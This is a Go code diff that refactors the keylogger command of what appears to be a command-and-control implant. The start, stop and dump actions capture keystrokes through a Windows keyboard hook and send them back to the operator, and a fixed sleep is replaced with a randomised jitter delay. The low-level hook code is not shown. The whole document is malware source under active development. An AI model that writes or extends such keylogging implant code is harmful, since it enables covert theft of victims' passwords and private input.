@@ -87,19 +87,11 @@ func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
 	var args keylogArgs
 
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: action required. Use: start, stop, dump",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: action required. Use: start, stop, dump")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	switch strings.ToLower(args.Action) {
@@ -110,11 +102,7 @@ func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
 	case "dump":
 		return keylogDump()
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: start, stop, dump", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: start, stop, dump", args.Action)
 	}
 }
 
@@ -122,11 +110,7 @@ func keylogStart() structs.CommandResult {
 	kl.mu.Lock()
 	if kl.running {
 		kl.mu.Unlock()
-		return structs.CommandResult{
-			Output:    "Keylogger is already running",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Keylogger is already running")
 	}
 	kl.running = true
 	kl.buffer.Reset()
@@ -144,29 +128,17 @@ func keylogStart() structs.CommandResult {
 		kl.mu.Lock()
 		kl.running = false
 		kl.mu.Unlock()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error starting keylogger: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error starting keylogger: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    "Keylogger started. Use 'keylog -action dump' to view captured keystrokes, 'keylog -action stop' to stop.",
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult("Keylogger started. Use 'keylog -action dump' to view captured keystrokes, 'keylog -action stop' to stop.")
 }
 
 func keylogStop() structs.CommandResult {
 	kl.mu.Lock()
 	if !kl.running {
 		kl.mu.Unlock()
-		return structs.CommandResult{
-			Output:    "Keylogger is not running",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Keylogger is not running")
 	}
 
 	// Post WM_QUIT to the message loop to stop it
@@ -182,16 +154,12 @@ func keylogStop() structs.CommandResult {
 	kl.mu.Unlock()
 
 	// Wait briefly for the hook to unhook
-	time.Sleep(200 * time.Millisecond)
+	jitterSleep(150*time.Millisecond, 350*time.Millisecond)
 
 	result := fmt.Sprintf("Keylogger stopped.\nDuration: %s\nKeystrokes captured: %d\n\n--- Captured Keystrokes ---\n%s",
 		duration.Round(time.Second), keyCount, output)
 
-	return structs.CommandResult{
-		Output:    result,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(result)
 }
 
 func keylogDump() structs.CommandResult {
@@ -199,32 +167,20 @@ func keylogDump() structs.CommandResult {
 	defer kl.mu.Unlock()
 
 	if !kl.running {
-		return structs.CommandResult{
-			Output:    "Keylogger is not running",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Keylogger is not running")
 	}
 
 	output := kl.buffer.String()
 	duration := time.Since(kl.startTime)
 
 	if output == "" {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Keylogger running for %s — no keystrokes captured yet", duration.Round(time.Second)),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Keylogger running for %s — no keystrokes captured yet", duration.Round(time.Second))
 	}
 
 	result := fmt.Sprintf("Keylogger running for %s — %d keystrokes captured\n\n--- Captured Keystrokes ---\n%s",
 		duration.Round(time.Second), kl.keyCount, output)
 
-	return structs.CommandResult{
-		Output:    result,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(result)
 }
 
 // keylogLoop runs the keyboard hook message pump
